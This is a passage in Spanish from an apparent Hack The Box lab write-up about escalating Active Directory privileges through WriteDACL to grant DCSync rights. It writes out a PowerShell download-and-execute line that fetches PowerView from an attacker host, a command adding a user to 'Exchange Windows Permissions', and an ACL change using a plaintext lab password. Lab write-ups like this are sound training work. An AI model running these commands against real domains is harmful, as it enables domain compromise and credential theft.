Vi que el usuario formaba parte del grupo `"Exchange Windows Permissions"`, tambien encontre que los derechos `writeDACL` le podian otorgar permisos `DCSync` a nuestro usuario, es decir que podia modificar la `ACL` y hacer un ataque `DCSync`, antes de añadir nuestro usuario al grupo `"Exchange Windows Permissions"` voy a transferirme `PowerView.ps1` para poder llevar a cabo el ataque, para ello hice uso del siguiente comando con un servior por `python` corriendo por el puerto `80`.

```powershell
IEX(New-Object Net.WebClient).downloadString("http://10.10.16.18/PowerView.ps1")
```

Ahora sí añadi el usuario al grupo `"Exchange Windows Permission"` con el siguiente comando.

```bash
net group "Exchange Windows Permission" svc-alfresco /add /domain
```

Y le otorgo permisos `DCSync` al usuario `svc-alfresco` con los siguientes comandos.

```powershell
pass = convertto-securestring 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
```
